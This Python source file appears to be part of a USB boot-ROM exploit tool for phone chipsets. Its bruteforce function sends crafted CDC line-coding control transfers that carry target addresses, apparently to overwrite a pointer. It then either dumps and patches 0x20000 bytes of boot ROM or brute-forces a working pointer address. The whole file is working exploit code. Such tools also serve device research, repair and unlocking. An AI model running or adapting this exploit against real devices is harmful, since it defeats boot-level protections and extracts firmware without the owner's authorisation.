from src.common import to_bytes, from_bytes

import usb
import array
import struct

def bruteforce(device, config, dump_ptr, dump=False):

    addr = config.watchdog_address + 0x50

    # We don't need to wait long, if we succeeded
    # noinspection PyBroadException
    try:
        device.dev.timeout = 1
    except Exception:
        pass

    udev = device.udev

    try:
        # noinspection PyProtectedMember
        udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
    except AttributeError as e:
        raise RuntimeError("libusb is not installed for port {}".format(device.dev.port)) from e

    linecode = udev.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])

    if dump:
        try:
            device.cmd_da(0, 0, 1)
            device.read32(addr)
        except:
            pass

        for i in range(4):
            udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(dump_ptr - 6 + (4 - i), 4, '<')))
            udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)

        brom = bytearray(device.cmd_da(0, 0, 0x20000))
        brom[dump_ptr - 1:] = b"\x00" + to_bytes(0x100030, 4, '<') + brom[dump_ptr + 4:]
        return brom

    else:
        try:
            device.cmd_da(0, 0, 1)
            device.read32(addr)
        except:
            pass

        for address in range(dump_ptr, 0xffff, 4):
            for i in range(3):
                udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(address - 5 + (3 - i), 4, '<')))
                udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
            try:
                if(len(device.cmd_da(0, 0, 0x40))) == 0x40:
                    return (True, address)
            except RuntimeError:
                try:
                    device.read32(addr)
                except:
                    return (False, address + 4)
            except Exception:
                return (False, address + 4)
